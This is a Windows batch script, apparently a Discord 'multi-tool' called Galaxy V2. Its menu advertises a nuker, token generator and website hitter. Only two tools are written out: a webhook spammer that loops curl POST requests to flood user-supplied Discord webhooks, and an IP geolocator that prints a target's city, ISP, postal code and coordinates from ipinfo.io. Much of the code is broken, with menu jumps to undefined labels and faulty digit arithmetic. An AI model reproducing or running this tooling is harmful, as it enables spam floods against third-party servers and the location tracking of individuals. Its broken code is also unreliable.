@echo off
title Galaxy V2 - Made by Lilcimbol
chcp 65001 >nul
cls

:start
:: Display the banner and menu togther
call :banner1
call :menu1
goto start :: Keep looping back to the menu instead of exiting

:: Initialize menu index
set menuIndex=1
set totalMenus=3

:banner1
ping localhost -n 2 >nul
echo [91m                      ██████╗  █████╗ ██╗      █████╗ ██╗  ██╗ ██╗ ██╗     ██╗   ██╗██████╗  [0m
ping localhost -n 1 >nul 
echo [37m                     ██╔════╝ ██╔══██╗██║     ██╔══██╗╚██╗██╔╝╚██╗ ██╔╝    ██║   ██║╚════██╗ [0m
ping localhost -n 1 >nul
echo [91m                     ██║  ███╗███████║██║     ███████║ ╚███╔╝  ╚████╔╝     ██║   ██║ █████╔╝ [0m
ping localhost -n 1 >nul
echo [37m                     ██║   ██║██╔══██║██║     ██╔══██║ ██╔██╗   ╚██╔╝      ╚██╗ ██╔╝██╔═══╝  [0m
ping localhost -n 1 >nul
echo [91m                     ╚██████╔╝██║  ██║███████╗██║  ██║██╔╝ ██╗   ██║        ╚████╔╝ ███████╗ [0m
ping localhost -n 1 >nul 
echo [37m                      ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝         ╚═══╝  ╚══════╝ [0m
goto :eof

:: Menu 1/3 with no banner spam
:menu1
cls
call :banner1
echo %menuIndex%%totalMenus%    [92m                                 press [/] for menu 2  press [\] for menu 3  [0m
:: Menu 1/3 with no banner spam                                                           
echo  [91m     01 : Webhook                         06 : Information                         11 : bot Spammer                    
echo  [92m    02 : Geo Locater                     07 : Phone Number gen                    12 : Lilcimbol Nuker V2
echo  [91m     03 : Pinger                          08 : Ip gen                              13 : Rainbow ip pinger
echo  [92m    04 : Saved stuff                     09 : Matrix Lilcimbol                    14 : proxie checker
echo  [91m     05 : Website Hitter                  10 : Roblox                              15 : Gen token's
echo  [93m
:: Get user option and validate it
echo ┌─── [98m(@userLilcimbol)   
echo │
set /p "option=          └─> "
:: Validate the option input
if "%option%"=="1" (
    goto Webhook
	) else if "%option%"=="2" (
	goto GeoLocater
	) else if "%option%"=="3" (
	goto Pinger
	) else if "%option%"=="4" (
	goto Saved
	) else if "%option%"=="5" (
	goto Website 
	) else if "%option%"=="6" (
	goto Information
	) else if "%option%"=="7" (
	goto Phonegen
	) else if "%option%"=="8" (
	goto Ipgen
	) else if "%option%"=="9" (
	goto Matrix 
) else if "%option%"=="10" (
goto Roblox
) else if "%option%"=="11" (
goto BotSpammer
) else if "%option%"=="12" (
goto menu2
) else if "%option%"=="13" (
goto Rainbow
) else if "%option%"=="14" (
goto proxieChecker
) else if "%option%"=="15" (
goto token
) else if "%option%"=="/" (
goto test
) else if "%option%"=="\" (
goto menu4
) else (
    echo Invalid option. Press any key to try again.
    pause
    goto menu1
)




:banner5
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠞⠋⣩⡷⠋⠉⠉⠉⠙⠲⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣲⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠙⠶⢤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⣸⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠉⠉⠳⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠸⣮⡇⠈⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⣏⡀⠀⠀⠀⠺⠏⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡗⠂⠀⠀⠀⠀⠀⠀⢀⡾⠉⠀⠀⠀⠙⢦⠀⣠⠴⠶⣿⠀⣤⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⡀⠀⠀⠀⠀⠀⠀⣿⠀⠀⢀⠀⠀⠀⢸⡟⠁⠀⠀⣸⠋⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⡄⠀⠀⠀⠀⠀⠉⣇⠀⠙⠃⠀⢠⡜⠁⣠⡴⠚⠁⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⣀⠀⠀⠈⠛⠒⠒⠚⢫⡷⠛⠁⠀⠀⣤⠴⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣙⢦⣘⡍⠓⣤⠀⠀⢀⣼⠋⢀⣠⣴⣾⣯⡾⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠛⢧⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⢶⣿⠀⠀⣼⣧⣾⣭⣾⣿⢿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣀⠀⣇⠀⠨⣿⢲⡄⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠳⢿⡿⣯⣠⠴⣿⣿⣿⣿⣿⣿⣸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⡂⣸⠟⠉⠀⠀⢹⡚⠁⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⢰⡿⠹⣆⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣏⠀⣿⢿⣿⣿⡟⢹⣿⡿⠦⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡟⠀⠀⠀⠀⠀⠛⠦⣤⣄⠀
echo ⠀⢀⣀⠀⠀⢀⣘⡷⠀⢹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠘⣏⠻⢿⣇⢀⣿⡿⢲⡿⢧⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⢀⣀⣽⠀
echo ⢸⣟⡉⠙⡟⠋⣀⠀⣰⣼⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣇⠀⠈⠛⠲⣬⡽⠷⣾⣚⠛⣾⡇⠙⣇⣀⣠⠤⣄⣀⠀⠀⠀⠀⣀⡴⠚⠁⠀⠀⠀⠀⠀⠀⣴⠟⠉⠁⠀⠀
echo ⠈⠛⢿⠀⡆⠀⡿⢿⣁⣀⡚⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣤⠤⠖⠚⠉⠀⠀⣇⠉⠙⠚⠛⢿⣍⠀⠀⠀⠀⠙⣦⠴⠒⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⣴⠋⠀⠀⠀⠀⠀
echo ⠀⠀⢸⣆⠙⠚⠉⠈⠉⠉⢠⣏⠀⠀⠀⢀⣀⣀⣀⣀⣠⡏⠀⠀⠀⠀⠀⢀⣠⡿⠃⠀⠀⠀⠀⠈⢳⡄⠀⠀⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠻⣦⠀⠀⠀⠀⠀⠀⠈⠉⠓⠶⠾⠭⣽⡄⠀⠉⠙⠲⢦⡤⠴⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠙⣆⠀⠀⠀⣷⡀⠀⠀⠀⠀⠀⠀⢀⡰⠋⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⠀⠀⠈⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⡄⠀⣿⠃⠀⠀⠀⠀⣀⡴⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠓⠧⣄⡀⣀⡤⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣄⡀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠑⠲⠦⠤⣤⠤⣾⢁⣀⠴⠎⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠤⠾⠟⠒⠲⠶⠦⣀⡀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠋⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠞⠉⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⠳⣄⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡞⠛⠛⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⢻⡀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠛⣄⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⡀⠀⠈⠳⣬⡳⣶⠢⠤⠤⠤⣤⣤⡤⠤⠤⠖⠚⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⡀⠀⠀⠀⠉⠻⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣤⠀⠀⣀⣀⣤⣿⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⢫⡿⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠛⠋⠁⠀⠀⠀⡼⠈⠓⠦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠴⠛⠁⢀⡼⣄⠀⠈⠳⣤⡀⠀⠀⠀⠀⠀⠀⡼⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡤⠴⠒⠛⠛⣻⠇⠀⠀⠀⠀⠈⠙⠛⠒⠒⠒⠒⠚⣻⠉⠁⠀⠀⠀⢠⡏⠀⠘⠳⣄⠀⠀⠈⠛⠦⢤⣀⣀⣼⠃⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣯⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⢰⣧⣤⠀⠀⠈⠛⠲⢤⣄⡀⠀⢀⡿⠁⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠙⣿⠀⠀⠀⠀⠀⠀⠀⠉⡟⠋⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⢠⡞⠁⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠑⠶⠶⠶⠶⠶⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⣀⠀⣀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀	
goto :eof

 
:Webhook
cls
call :banner5
echo ╔═════════════════════════════════════╗
echo ║       Discord webhook spammer       ║
echo ║          Made By Lilcimbol          ║
echo ╚═════════════════════════════════════╝
echo.
echo.
set /p "num_webhooks=  │ [? Lilcimbol bot ?] │  How many webhooks:  "
set /p "message=       │ [? Lilcimbol bot ?] │  Message: "
set /p "num_times=     │ [? Lilcimbol bot ?] │  How many:  "
set /p "delay=         │ [? Lilcimbol bot ?] │  Delay:  "

:: Collect the webhooks from the user dynamically
setlocal enabledelayedexpansion
for /L %%i in (1,1,%num_webhooks%) do (
    set /p "webhook=  │ [? Lilcimbol bot ?] │  Url for Webhook %%i: "
    set "webhook[%%i]=!webhook!"
)

:: Add the "Connecting to the webhook" message before starting
echo ╔════════════════════════════════╗
echo ║   Connecting to the webhooks   ║
echo ╚════════════════════════════════╝
timeout /t 2 >nul

:: Loop to send the message the specified number of times
for /L %%n in (1,1,%num_times%) do (
    for /L %%i in (1,1,%num_webhooks%) do (
        start "" /B curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%message%\"}" !webhook[%%i]!
        timeout /t %delay% >nul
    )
)

echo Done
pause
cls
goto start
goto :eof


:banner2
echo.
echo.
echo.
echo                                ┌────────────────────────────────────────────────┐
echo                                │  ▪  ▄▄▄·    ▄▄▌               ▄ •▄ ▄• ▄▌▄▄▄·   │
echo                                │ ██ ▐█ ▄█    ██•  ▪     ▪      █▌▄▌ █▪██▐█ ▄█   │
echo                                │ ▐█·██▀·     ██▪   ▄█▀▄  ▄█▀▄ ▐▀▀▄· █▌▐█▌██▀    │
echo                                │ ▐█▌▐█▪·•    ▐█▌▐▌▐█▌.▐▌▐█▌.▐▌▐█.█▌ ▐█▄█▌▐█▪·•  │
echo                                │ ▀▀▀.▀       .▀▀▀  ▀█▄▀▪ ▀█▄▀▪·▀  ▀  ▀▀▀ .▀     │  
echo                                └────────────────────────────────────────────────┘
echo.
echo.
echo.
echo       ╔═════════════╗
echo       ║             ║
echo       ║             ║
echo       ║             ║
echo       ║             ║
echo       ║             ║
echo       ╚═════════════╝
echo      /:::::::::::::::\
echo     /:::═══════════:::\
echo     ═══════════════════
goto :eof



:GeoLocater
cls

call :banner2
echo.
set /p ip=IP Address: 
cls
setlocal ENABLEDELAYEDEXPANSION
set webclient=webclient
if exist "%temp%\%webclient%.vbs" del "%temp%\%webclient%.vbs" /f /q /s >nul
if exist "%temp%\response.txt" del "%temp%\response.txt" /f /q /s >nul
:iplookup
echo sUrl = "http://ipinfo.io/%ip%/json" > %temp%\%webclient%.vbs
:localip
cls
echo set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0") >> %temp%\%webclient%.vbs
echo oHTTP.open "GET", sUrl,false >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded" >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Length", Len(sRequest) >> %temp%\%webclient%.vbs
echo oHTTP.send sRequest >> %temp%\%webclient%.vbs
echo HTTPGET = oHTTP.responseText >> %temp%\%webclient%.vbs
echo strDirectory = "%temp%\response.txt" >> %temp%\%webclient%.vbs
echo set objFSO = CreateObject("Scripting.FileSystemObject") >> %temp%\%webclient%.vbs
echo set objFile = objFSO.CreateTextFile(strDirectory) >> %temp%\%webclient%.vbs
echo objFile.Write(HTTPGET) >> %temp%\%webclient%.vbs
echo objFile.Close >> %temp%\%webclient%.vbs
echo Wscript.Quit >> %temp%\%webclient%.vbs
start %temp%\%webclient%.vbs
set /a requests=0
:checkresponseexists
set /a requests=%requests% + 1
if %requests% gtr 7 goto failed
IF EXIST "%temp%\response.txt" (
goto response_exist
) ELSE (
ping 127.0.0.1 -n 2 -w 1000 >nul
goto checkresponseexists
)
:failed
taskkill /f /im wscript.exe >nul
del "%temp%\%webclient%.vbs" /f /q /s >nul
echo.
echo Did not receive a response from the API.
echo.
pause
goto menu
:response_exist
cls
echo.
for /f "delims=     " %%i in ('findstr /i "," %temp%\response.txt') do (
    set data=%%i
    set data=!data:,=!
    set data=!data:""=Not Listed!
    set data=!data:"=!
    set data=!data:ip:=IP:      !
    set data=!data:hostname:=Hostname:  !
    set data=!data:org:=ISP:        !
    set data=!data:city:=City:      !
    set data=!data:region:=State:   !
    set data=!data:country:=Country:    !
    set data=!data:postal:=Postal:  !
    set data=!data:loc:=Location:   !
    set data=!data:timezone:=Timezone:  !
    echo !data!
)
echo.
:: Generate a more realistic fake phone number
set /a area_code1=%random% %% 8 + 2   :: First digit of area code (2-9)
set /a area_code2=%random% %% 10 + 1   :: Second digit of area code (0-9)
set /a area_code3=%random% %% 10 + 1   :: Third digit of area code (0-9)
set /a prefix1=%random% %% 8 + 2       :: First digit of prefix (2-9)
set /a prefix2=%random% %% 10 + 1      :: Second digit of prefix (0-9)
set /a prefix3=%random% %% 10 + 1      :: Third digit of prefix (0-9)
set /a line1=%random% %% 10 + 1        :: First digit of line (0-9)
set /a line2=%random% %% 10 + 1        :: Second digit of line (0-9)
set /a line3=%random% %% 10000 + 1000  :: Last 4 digits (100-999)

set fakephone=!area_code1!!area_code2!!area_code3!-!prefix1!!prefix2!!prefix3!-!line1!!line2!!line3!
echo number: !fakephone!
del "%temp%\%webclient%.vbs" /f /q /s >nul
del "%temp%\response.txt" /f /q /s >nul
if '%ip%'=='' goto menu
pause    ### Added to prevent instant closure
timeout /t 60 /nobreak >nul
goto :menu1




:banner3
echo.
echo.
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠆⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠴⠋⠀⠀⠀⠀⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⢠⠐⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⡼⠇⠀⠀⠀⠘⡆⠀⠀⠐⠀⠀⠀⢀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠈⠓⠢⢼⠀⠀⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀⠀⣠⠎⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⠈⣇⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⡰⠃⠀⠀⠀⠀⠀⠀⢀⡼⡇⠀⠀⠀⠀⠀⠀⢸⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⣸⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⢠⠞⠀⢹⡄⠀⠀⠀⠀⠀⠘⡇⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⣰⠁⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠘⣧⠀⠀⠀⠀⠀⠀⢹⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⡴⠃⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢸⡇
echo ⠀⠀⠀⠀⠀⠀⠀⢰⠋⠀⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠀⠛⠀⠀⠀⠀⠀⢸⡁⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢸⡇
echo ⠀⠀⠀⠀⠀⠀⢠⡏⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⡿⣯⡷⡴⢦⣤⡠⣶⡶⠀⢷⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⡾⠀
echo ⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀⠀⣼⣥⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠈⢧⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⢀⡇⠀
echo ⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⣿⣿⣿⠛⢦⠀⠀⢸⡇⠀⠀⠀⠀⠀⢸⡇⠀
echo ⠀⠀⠀⠀⢠⡏⠀⠀⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⠳⠀⢳⡀⢹⡇⠀⠀⠀⠀⠀⡾⡇⠀
echo ⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡿⠘⠀⠀⠹⣼⡇⠀⠀⠀⠀⢠⠇⠀⠀
echo ⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡿⠁⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⡾⠀⠀⠀
echo ⠀⠀⢠⡏⠀⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠁⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⢸⠁⠀⠀⠀
echo ⠀⠀⡾⠀⠀⠀⠀⠀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠀⡟⠀⠀⠀⠀
echo ⠀⣴⠓⣾⣳⣀⢀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠃⠀⠀⠀⠀⠀⠀⢸⡇⢀⠇⠀⠀⠀⠀
echo ⣾⠃⠀⠀⠀⠑⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⠀⠀⠀⠀⠈⡇⢸⠀⠀⠀⠀⠀
echo ⠹⡀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⣾⠀⠀⠀⠀⠀
echo ⠀⢳⡄⠀⠀⠀⠀⠘⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⣿⠀⠀⠀⠀⠀
echo ⠀⠀⣷⡄⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⡏⠀⠀⠀⠀⠀
